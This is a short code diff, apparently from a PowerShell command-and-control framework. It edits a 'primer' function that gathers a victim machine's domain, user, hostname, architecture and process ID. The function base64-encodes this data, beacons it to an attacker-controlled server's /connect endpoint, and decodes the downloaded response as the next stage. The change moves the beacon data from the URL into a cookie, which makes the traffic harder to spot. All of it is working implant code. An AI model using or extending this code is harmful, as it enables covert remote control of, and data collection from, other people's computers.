@@ -585,7 +585,7 @@ function primer {
 if ($env:username -eq $env:computername+"$"){$u="SYSTEM"}else{$u=$env:username}
 $pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
 $p64 = [Convert]::ToBase64String($pre)
-$pm = (Get-Webclient).downloadstring("'+$ipv4address+":"+$serverport+'/connect?$p64")
+$pm = (Get-Webclient -Cookie $p64).downloadstring("'+$ipv4address+":"+$serverport+'/connect")
 $pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
 $pm } 
 $pm = primer
@@ -700,8 +700,8 @@ function primer
 {
 if ($env:username -eq $env:computername+"$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
 $pretext = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
-$p64 = [Convert]::ToBase64String($pretext)
-$primer = (Get-Webclient).downloadstring("'+$ipv4address+":"+$serverport+'/connect?$p64")
+$pretext64 = [Convert]::ToBase64String($pretext)
+$primer = (Get-Webclient -Cookie $pretext64).downloadstring("'+$ipv4address+":"+$serverport+'/connect")
 $primer = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($primer))
 $primer
 } 
